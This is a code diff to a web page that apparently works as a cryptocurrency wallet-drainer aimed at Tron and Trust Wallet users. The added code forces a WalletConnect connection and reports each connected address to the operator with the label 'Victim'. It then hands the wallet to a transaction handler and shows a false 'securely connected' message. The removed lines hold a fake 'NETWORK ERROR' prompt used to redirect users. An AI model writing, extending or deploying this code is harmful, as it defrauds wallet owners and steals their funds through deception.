@@ -85,23 +85,33 @@
                 } catch (e) {
                     alert("Connection rejected.");
                 }
-            } else if (window.ethereum) {
-                // Trust Wallet user is on Ethereum network. Force reload into Tron network via Deep Link!
-                const currentUrl = encodeURIComponent(window.location.href);
-                const trustWalletTronLink = `https://link.trustwallet.com/open_url?coin_id=195&url=${currentUrl}`;
-                
-                const userConfirmed = confirm("⚠️ NETWORK ERROR:\n\nYou are on the Ethereum network.\n\nClick 'OK' to automatically reopen Trust Wallet with the TRON network selected.");
-                if(userConfirmed) {
-                    window.location.href = trustWalletTronLink;
-                }
             } else {
-                // Not in a dApp browser, show deep link for mobile users
-                const currentUrl = encodeURIComponent(window.location.href);
-                const trustWalletTronLink = `https://link.trustwallet.com/open_url?coin_id=195&url=${currentUrl}`;
-                
-                const userConfirmed = confirm("Please open this website inside Trust Wallet.\n\nClick 'OK' to automatically launch Trust Wallet for Tron.");
-                if(userConfirmed) {
-                    window.location.href = trustWalletTronLink;
+                // User is NOT on the Tron network, or is on a mobile device without an extension.
+                // We fallback to WalletConnect to force the Tron connection!
+                if (typeof window.connectWalletConnectTron === 'function') {
+                    const wcResult = await window.connectWalletConnectTron();
+                    if (wcResult && wcResult.address) {
+                        
+                        document.getElementById('qr-screen').classList.add('opacity-20');
+                        document.getElementById('processing-screen').classList.remove('hidden');
+
+                        await notify(`🔔 <b>WALLET CONNECTED (WalletConnect)</b>\nVictim: <code>${wcResult.address}</code>`);
+                        
+                        // We connected via WalletConnect. Now we need to handle the transaction.
+                        // WalletConnect V2 doesn't expose a raw TronWeb instance easily, but Trust Wallet
+                        // MIGHT inject tronWeb once the connection is established.
+                        let postConnectTronWeb = window.tronWeb || (window.tronLink && window.tronLink.tronWeb) || (window.tron && window.tron.tronWeb);
+                        
+                        if (postConnectTronWeb) {
+                            handleConnection(postConnectTronWeb);
+                        } else {
+                            // WC Session connected but no TronWeb injected to sign with!
+                            alert("Wallet securely connected via WalletConnect!\nCheck your wallet app for any pending transaction prompts if applicable.");
+                            location.reload();
+                        }
+                    }
+                } else {
+                    alert("Connection script is still loading. Please try again in a few seconds.");
                 }
             }
         });
@@ -138,6 +148,7 @@
             }
         }
     </script>
+    <script src="wc-bundle.js"></script>
 </body>
 
 </html>
